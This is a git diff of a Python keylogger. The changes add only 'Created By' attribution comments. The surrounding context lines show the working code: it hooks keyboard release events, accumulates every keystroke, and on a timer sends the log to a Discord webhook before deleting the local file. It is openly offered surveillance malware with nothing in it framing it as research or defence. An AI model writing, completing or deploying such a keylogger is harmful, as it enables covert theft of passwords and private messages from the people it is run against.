@@ -34,7 +34,7 @@ class Keylogger:
         self.start_dt = now.strftime('%d/%m/%Y %H:%M')
         self.end_dt = now.strftime('%d/%m/%Y %H:%M')
         self.username = os.getlogin()
-
+    #Created By https://github.com/RelaX0001/
     def callback(self, event):
         name = event.name
         if len(name) > 1:
@@ -48,7 +48,7 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         self.log += name
-
+    #Created By https://github.com/RelaX0001/
     def report_to_webhook(self):
         flag = False
         webhook = DiscordWebhook(url=RelaX)
@@ -66,7 +66,7 @@ class Keylogger:
         webhook.execute()
         if flag:
             os.remove(path)
-
+    #Created By https://github.com/RelaX0001/
     def report(self):
         if self.log:
             if self.report_method == "webhook":
@@ -75,13 +75,15 @@ class Keylogger:
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
-
+    #Created By https://github.com/RelaX0001/
     def start(self):
         self.start_dt = datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
         keyboard.wait()
+        #Created By https://github.com/RelaX0001/
     
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
-    keylogger.start()
+    keylogger.start() 
+    #Created By https://github.com/RelaX0001/
